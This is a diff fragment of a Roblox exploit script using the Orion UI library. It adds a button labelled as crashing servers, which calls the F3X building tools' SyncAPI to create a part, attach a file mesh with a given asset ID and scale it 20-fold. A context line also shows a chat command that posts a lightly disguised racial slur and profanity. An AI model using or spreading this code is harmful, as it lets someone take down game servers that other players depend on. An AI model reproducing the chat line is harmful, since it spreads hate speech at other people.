@@ -404,4 +404,65 @@ chat("FJJUCJJK YOU LOL BJJITCJJH NJJIGGER")
         end    
 })
 
+Tab:AddButton({
+      Name = "Crash servers No Build Need (Execute while f3x)",
+      Callback = function()
+local args = {
+    [1] = "CreatePart",
+    [2] = "Normal",
+    [3] = CFrame.new(Vector3.new(-7.888767242431641, 20.000003814697266, 16.156932830810547), Vector3.new(-0, -0, -1)),
+    [4] = workspace
+}
+
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+task.wait(1)
+local args = {
+    [1] = "CreateMeshes",
+    [2] = {
+        [1] = {
+            ["Part"] = workspace.Part
+        }
+    }
+}
+
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+task.wait(1)
+local args = {
+    [1] = "SyncMesh",
+    [2] = {
+        [1] = {
+            ["MeshType"] = Enum.MeshType.FileMesh,
+            ["Part"] = workspace.Part
+        }
+    }
+}
+
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+task.wait(1)
+local args = {
+    [1] = "SyncMesh",
+    [2] = {
+        [1] = {
+            ["Part"] = workspace.Part,
+            ["MeshId"] = "rbxassetid://9065416517"
+        }
+    }
+}
+
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+task.wait(1)
+local args = {
+    [1] = "SyncMesh",
+    [2] = {
+        [1] = {
+            ["Scale"] = Vector3.new(20, 20, 20),
+            ["Part"] = workspace.Part
+        }
+    }
+}
+
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+        end    
+})
+
 OrionLib:Init()
